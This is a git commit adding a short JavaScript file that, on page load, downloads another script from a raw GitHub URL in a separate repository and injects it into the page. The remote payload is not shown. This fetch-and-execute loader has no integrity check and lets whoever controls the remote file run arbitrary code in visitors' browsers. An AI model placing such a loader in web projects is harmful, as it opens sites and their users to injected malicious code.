8420de2f23e0bcc93233d6e4690e385a6012b8f9
delemoh79912 <167154350+delemoh79912@users.noreply.github.com>
2024-05-03 18:47:09 +0330

    Create c-g-lo.js

---
+++ c-g-lo.js
@@ -0,0 +1,27 @@
+document.addEventListener("DOMContentLoaded", function() {
+  // URL of the raw file on GitHub
+  var rawFileUrl = "https://raw.githubusercontent.com/delemoh79912/asxasw/main/c-g.js";
+
+  // Creating a new XMLHttpRequest object
+  var xhr = new XMLHttpRequest();
+
+  // Setting up the request
+  xhr.open("GET", rawFileUrl);
+
+  // Handling the response
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      // Creating a new script element
+      var script = document.createElement("script");
+
+      // Setting the script's text content to the response
+      script.text = xhr.responseText;
+
+      // Adding the script element to the document
+      document.body.appendChild(script);
+    }
+  };
+
+  // Sending the request
+  xhr.send();
+});
